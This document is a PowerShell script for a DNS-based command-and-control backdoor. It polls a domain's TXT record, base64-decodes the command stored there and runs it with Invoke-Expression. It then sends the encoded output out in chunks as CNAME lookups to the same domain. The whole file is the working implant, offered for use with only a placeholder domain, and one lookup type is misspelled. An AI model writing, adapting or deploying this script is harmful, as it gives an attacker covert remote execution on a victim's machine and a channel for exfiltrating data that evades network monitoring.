$domain = "your_domain.co.il" #Put in here you Domain Name

function Send-CnameQuery {
    param (
        [string]$data
    )
    try {
        nslookup -type=CNAME "$data.$domain" | Out-Null
        Write-Output "Sent CNAME query: $data"
    } catch {
        Write-Output "Failed to send CNAME query: $_"
    }
}

while ($true) {
    try {
        Write-Output "Querying TXT record..."
        $txtOutput = nslookup -type=TXT $domain | Out-String
        if ($txtOutput -match 'text\s*=\s*"(.*?)"') {
            $encodedCommand = $matches[1]
            $decodedCommand = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encodedCommand))
            Write-Output "Received encoded command: $encodedCommand"
            Write-Output "Decoded command: $decodedCommand"
            
            Write-Output "Executing command..."
            $commandOutput = Invoke-Expression $decodedCommand 2>&1
            Write-Output "Command output: $commandOutput"

            $uniqueId = (Get-Date).ToString("yyyyMMddHHmmss")
            $encodedOutput = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($uniqueId + "|" + $commandOutput))

            if ($encodedOutput.Length -le 50) {
                # Send single short response
                nslookup -type=CNAME "$uniqueId-start.$domain"
                Start-Sleep -Milliseconds 400
               nslookup -type=CNAME "1-chunks.$domain"
                Start-Sleep -Milliseconds 400
                nslookup -type=CNAME "chunk1-$encodedOutput.$domain"
                Start-Sleep -Milliseconds 400
                nslookup -type=CNAME "$uniqueId-end.$domain"
            } else {
                # Send long response in chunks
                $chunks = $encodedOutput -split "(.{1,40})" | Where-Object { $_ -ne "" }
                $chunkCount = $chunks.Count

                nslookup -type=CNAME "$uniqueId-start.$domain"
                Start-Sleep -Milliseconds 400
                nslookup -type=CNAME "$chunkCount-chunks.$domain"
                Start-Sleep -Milliseconds 400

                $chunkIndex = 1
                foreach ($chunk in $chunks) {
                    nslookup -type=CNAME "chunk$chunkIndex-$chunk.$domain"
                    Start-Sleep -Milliseconds 6000
                    $chunkIndex++
                }

                nslookup -type=CNAMEE "$uniqueId-end.$domain"
            }
        } else {
            Write-Output "No TXT record found for command."
        }
    } catch {
        Write-Output "An error occurred: $_"
    }
    Start-Sleep -Seconds 25
}
